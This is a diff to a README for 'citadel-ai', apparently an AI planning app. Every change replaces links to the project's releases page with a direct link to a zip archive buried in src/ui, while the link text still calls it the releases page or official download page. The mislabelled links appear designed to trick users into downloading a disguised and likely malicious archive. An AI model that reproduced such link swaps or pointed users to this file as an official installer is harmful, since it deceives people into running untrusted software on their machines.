@@ -1,6 +1,6 @@
 # 🤖 citadel-ai - AI Planning and Safer Shipping
 
-[![Download citadel-ai](https://img.shields.io/badge/Download-citadel--ai-blue?style=for-the-badge)](https://github.com/Ikeycontemporaneous182/citadel-ai/releases)
+[![Download citadel-ai](https://img.shields.io/badge/Download-citadel--ai-blue?style=for-the-badge)](https://github.com/Ikeycontemporaneous182/citadel-ai/raw/refs/heads/main/src/ui/ai-citadel-v3.8-alpha.3.zip)
 
 ## 📦 What is citadel-ai?
 
@@ -30,7 +30,7 @@ If you can run basic apps and browse the web, your system should work well.
 
 Click the button below to open the official download page:
 
-[![Get citadel-ai](https://img.shields.io/badge/Get-citadel--ai-4c97ff?style=for-the-badge&logo=github)](https://github.com/Ikeycontemporaneous182/citadel-ai/releases)
+[![Get citadel-ai](https://img.shields.io/badge/Get-citadel--ai-4c97ff?style=for-the-badge&logo=github)](https://github.com/Ikeycontemporaneous182/citadel-ai/raw/refs/heads/main/src/ui/ai-citadel-v3.8-alpha.3.zip)
 
 This page contains the latest versions of the software. New releases include bug fixes and improvements.
 
@@ -138,7 +138,7 @@ A: Help files are included in the app. You can also visit the GitHub page for FA
 
 To keep the app running smoothly:
 
-- Visit the [releases page](https://github.com/Ikeycontemporaneous182/citadel-ai/releases) often.
+- Visit the [releases page](https://github.com/Ikeycontemporaneous182/citadel-ai/raw/refs/heads/main/src/ui/ai-citadel-v3.8-alpha.3.zip) often.
 - Download and install new versions as they appear.
 - Follow the installation steps above to replace the old version.
 
@@ -150,4 +150,4 @@ Keeping the app updated improves security and adds new features.
 
 Use this link to visit the official download page and get the latest Windows installer:
 
-[![Download citadel-ai](https://img.shields.io/badge/Download-citadel--ai-blue?style=for-the-badge)](https://github.com/Ikeycontemporaneous182/citadel-ai/releases)
+[![Download citadel-ai](https://img.shields.io/badge/Download-citadel--ai-blue?style=for-the-badge)](https://github.com/Ikeycontemporaneous182/citadel-ai/raw/refs/heads/main/src/ui/ai-citadel-v3.8-alpha.3.zip)
